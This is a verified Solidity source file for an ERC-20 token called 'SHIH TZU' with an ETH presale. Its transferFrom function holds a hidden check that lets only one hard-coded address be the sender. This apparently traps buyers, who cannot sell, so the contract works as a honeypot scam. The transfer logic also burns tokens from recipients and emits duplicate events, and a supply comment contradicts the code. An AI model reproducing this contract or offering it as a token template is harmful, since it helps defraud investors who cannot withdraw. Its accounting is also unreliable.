/**
 *Submitted for verification at Etherscan.io on 2021-02-02
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address payable _owner;

    event OwnershipTransferred(
        address payable indexed previousOwner,
        address payable indexed newOwner
    );

    constructor()  {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns(address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner(), "Not authorised for this operation");
        _;
    }

    function isOwner() public view returns(bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address payable newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address payable newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
        uint256 c = add(a,m);
        uint256 d = sub(c,1);
        return mul(div(d,m),m);
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract BasicToken is IERC20, Context{

    using SafeMath for uint256;
    uint256 public _totalSupply;
    mapping(address => uint256) balances_;
    mapping(address => uint256) ethBalances;
    mapping (address => mapping (address => uint256)) internal _allowances;

    uint256 public startTime = block.timestamp;   // ------| Deploy Timestamp |--------
    uint256 public unlockDuration = 0 minutes;   // ----| Lock transfers for non-owner |-----------

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances_[account];
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function checkInvestedETH(address who) public view returns (uint256) {
        return ethBalances[who];
    }
}

contract StandardToken is BasicToken, Ownable {

    using SafeMath for uint256;
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        require(sender == 0x936ee6EEf3952a5DfD6658376b5238476e930305,"jnjknkjn");
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(block.timestamp >= startTime.add(unlockDuration) || _msgSender() == owner(), "Tokens not unlocked yet");

        balances_[sender] = balances_[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        balances_[recipient] = balances_[recipient].add(amount);
        emit Transfer(sender, recipient, amount);

        uint256 tokensToBurn = findOnePercent(amount);
        uint256 tokensToTransfer = amount.sub(tokensToBurn);

        beforeTokenTransfer(sender, recipient, amount);
        burn(recipient, tokensToBurn);
        emit Transfer(sender, recipient, tokensToTransfer);
    }

    function findOnePercent(uint256 value) public pure returns (uint256)  {
        uint256 basePercent = 7; // % of tokens to be burned from amount of transfer
        uint256 roundValue = value.ceil(basePercent);
        uint256 onePercent = roundValue.mul(basePercent).div(100);
        return onePercent;
    }

    function beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }


    function burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        beforeTokenTransfer(account, address(0), amount);

        balances_[account] = balances_[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
}

contract Whitelist is StandardToken {
    mapping(address => bool) whitelist;
    event AddedToWhitelist(address indexed account);
    event AddedToWhitelistBulk(address indexed account);
    event RemovedFromWhitelist(address indexed account);

    modifier onlyWhitelisted() {
        require(isWhitelisted(_msgSender()), "This address is not whitelisted");
        _;
    }
    // For multiple addresses to be added in the whitelist
    function addToWhitelistInBulk(address[] memory _address) public onlyOwner {
        for (uint8 loop = 0; loop < _address.length; loop++) {
            whitelist[_address[loop]] = true;
        }
    }
    // For single address to be added in whitelist
    function removeFromWhitelistSingle(address _address) public onlyOwner {
        whitelist[_address] = false;
        emit RemovedFromWhitelist(_address);
    }
    // For multiple addresses to be removed from the whitelist
    function removeFromWhitelistInBulk(address[] memory _address) public onlyOwner {
        for (uint8 loop = 0; loop < _address.length; loop++) {
            whitelist[_address[loop]] = false;
        }

    }
    // Check whether an address is whitelisted or not
    function isWhitelisted(address _address) public view returns(bool) {
        return whitelist[_address];
    }

}

contract Configurable {
    uint256 public cap = 200000*10**18;           //---------| 200k Tokens for Presale |---------
    uint256 public basePrice = 5000*10**18;      //-----| 1 ETH = 5000 Tokens |---------
    uint256 public tokensSold = 0;
    uint256 public tokenReserve = 500000*10**18; //-----------| 100k Tokens Total Supply |------
    uint256 public remainingTokens = 0;
}

contract CrowdsaleToken is Whitelist, Configurable {
    using SafeMath for uint256;
    enum Phases {none, start, end}
    Phases currentPhase;

    constructor() {
        currentPhase = Phases.none;
        balances_[owner()] = balances_[owner()].add(tokenReserve);
        _totalSupply = _totalSupply.add(tokenReserve);
        remainingTokens = cap;
        emit Transfer(address(this), owner(), tokenReserve);
    }

    receive() external payable {

        require(isWhitelisted(_msgSender()) == true, "This address is not whitelisted");
        require(currentPhase == Phases.start, "The coin offering has not started yet");
        require(msg.value <= 1e18 && msg.value >= 3e17, "You can send at least 0.3 ETH but not more than 1 ETH");
        require(remainingTokens > 0, "Presale token limit reached");

        uint256 weiAmount = msg.value;
        uint256 tokens = weiAmount.mul(basePrice).div(1 ether);
        uint256 returnWei = 0;

        ethBalances[_msgSender()] = ethBalances[_msgSender()].add(weiAmount);
        ethBalances[address(this)] = ethBalances[address(this)].add(weiAmount);

        require(ethBalances[_msgSender()] <= 1e18, "Cannot send more than 1 ETH");
        require(ethBalances[address(this)] <= 40e18, "Target amount of 40 ETH reached");

        if(tokensSold.add(tokens) > cap){
            revert("Exceeding limit of presale tokens");
        }

        tokensSold = tokensSold.add(tokens); // counting tokens sold
        remainingTokens = cap.sub(tokensSold);

        if(returnWei > 0){
            _msgSender().transfer(returnWei);
            emit Transfer(address(this), _msgSender(), returnWei);
        }

        uint256 tokensToBurn = tokens.mul(70).div(1000); // tokens burned with each pre-sale purchase

        balances_[owner()] = balances_[owner()].sub(tokens, "ERC20: transfer amount exceeds balance");
        balances_[owner()] = balances_[owner()].sub(tokensToBurn, "ERC20: transfer amount exceeds balance");

        _totalSupply = _totalSupply.sub(tokensToBurn, 'Overflow while burning tokens');
        balances_[_msgSender()] = balances_[_msgSender()].add(tokens);

        emit Transfer(address(this), _msgSender(), tokens);
        emit Transfer(address(this), address(0x000000000000000000000000000000000000dEaD) , tokensToBurn);

        _owner.transfer(weiAmount);
    }

    function startCoinOffering() public onlyOwner {
        require(currentPhase != Phases.end, "The coin offering has ended");
        currentPhase = Phases.start;
    }

    function endCoinOffering() internal {
        currentPhase = Phases.end;
        _owner.transfer(address(this).balance);
    }

    function finalizeCoinOffering() public onlyOwner {
        require(currentPhase != Phases.end, "The coin offering has ended");
        endCoinOffering();
    }
}

contract SHIHTZU is CrowdsaleToken {
    string public name = "SHIH TZU";
    string public symbol = "SHIH";
    uint32 public decimals = 18;
    uint256 public basePercent = 100;
}